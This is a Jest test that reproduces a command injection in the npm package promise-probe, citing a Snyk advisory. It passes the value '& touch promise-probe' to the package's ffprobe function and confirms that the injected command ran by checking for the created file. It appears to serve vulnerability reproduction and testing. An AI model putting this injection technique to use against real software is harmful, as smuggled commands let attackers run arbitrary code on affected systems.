//https://snyk.io/vuln/SNYK-JS-PROMISEPROBE-546816
test("Command Injection in promise-probe", async () => {
  expect.assertions(2);
  const root = require("promise-probe");
  const fs = require("fs");
  const path = "./promise-probe";
  const sleep = require("sleep");
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log("File removed:", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  let attack_code = "& touch promise-probe";
  // return root.ffprobe(attack_code).finally(()=>{
  //   file_exist = fs.existsSync(path);
  //   expect(file_exist).toBe(true);
  //   fs.unlink(path, function (err) {});
  // });

  try {
    await root.ffprobe(attack_code);
  } catch (err) {}
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlink(path, function (err) {});
});
